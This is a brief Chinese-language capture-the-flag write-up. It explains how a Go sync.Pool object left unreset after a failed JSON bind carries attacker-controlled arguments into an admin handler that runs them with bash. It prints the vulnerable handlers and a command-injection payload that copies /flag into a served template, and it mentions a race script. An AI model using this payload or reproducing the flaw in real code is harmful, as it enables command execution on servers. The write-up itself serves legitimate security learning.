用ai分析的时候了解了一下go语言的pool

在 Go 语言中，频繁地创建和销毁对象会给垃圾回收（GC）带来压力。为了优化性能，开发者使用了 sync.Pool。

在monitor.go文件中
```go
func UserCmd(c *gin.Context) {
    // 获取一个对象
    monitor := MonitorPool.Get().(*MonitorStruct)
    
    // 无论函数如何结束，都会将对象放回池子
    defer MonitorPool.Put(monitor) 

    // 将用户 JSON 绑定到对象
    if err := c.ShouldBindJSON(monitor); err != nil {
        // 如果解析报错，函数直接返回，漏洞点
        c.JSON(400, gin.H{"error": err.Error()})
        return 
    }

    //这行代码在 Error 检查之后
    // 只有 JSON 绑定完全成功，这行 defer 才会生效
    defer monitor.reset() 
}
```

```go
func AdminCmd(c *gin.Context) {
    monitor := MonitorPool.Get().(*MonitorStruct) // 极大概率拿到刚才污染的对象
    defer MonitorPool.Put(monitor)
    
    if err := c.ShouldBindJSON(monitor); err != nil { ... }
    
    // 拼接命令：Cmd(管理员控制) + Args(来自被污染的对象)
    fullCommand := fmt.Sprintf("%s %s", monitor.Cmd, monitor.Args)
    
    // 执行命令
    output, err := exec.Command("bash", "-c", fullCommand).CombinedOutput()
}
```
因此需要跳过reset，把污染过的命令给到admin去执行，因为题目说了每隔一段时间会执行ls，需要把污染的命令给到admin
`payload = "; cat /flag > templates/login.html"`

`{"args": "; cat /flag > templates/login.html", "cmd": 123}`
构造的错误json，结构体要求的是string，但是cmd键值是123为整数，因此函数结束返回

刚好最近看了dnslog，最开始想到的是DNSlog带出，但是没有成功可能没发出去
后面用ai写了py脚本直接多线程竞争污染，尝试了文件覆盖，将结果直接覆盖了/login得到flag